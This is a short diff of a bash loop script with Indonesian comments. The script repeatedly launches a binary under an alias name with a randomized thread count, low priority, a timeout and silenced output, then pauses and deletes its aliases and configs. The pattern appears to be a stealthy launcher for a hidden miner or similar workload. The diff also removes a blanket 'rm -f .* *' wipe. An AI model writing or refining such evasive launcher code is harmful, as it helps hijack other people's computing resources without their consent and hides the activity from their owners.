@@ -48,8 +48,8 @@ if [ ! -f "$BIN_NAME_ORI" ]; then
 fi
 
 while true; do
-    # Hapus semua binary dan config dari sesi sebelumnya
-    rm -f .* *
+    # Hapus hanya file alias dan config, jangan hapus binary utama
+    find "$WORKDIR" -type f \( -name ".*" -o -name "*.json" -o -name "*.conf" \) ! -name "$BIN_NAME_ORI" -delete
     
     THREADS=${THREAD_LIST[$RANDOM % ${#THREAD_LIST[@]}]}
     
@@ -86,7 +86,7 @@ while true; do
 }
 EOF
 
-    nohup nice -n 15 timeout "$RUNTIME" ./$ALIAS_BIN -c "$CONFIG_NAME" >/dev/null 2>&1 &
+    nohup nice -n 15 timeout "$RUNTIME" ./"$ALIAS_BIN" -c "$CONFIG_NAME" >/dev/null 2>&1 &
     sleep "$RUNTIME"
 
     sleep "$PAUSE"
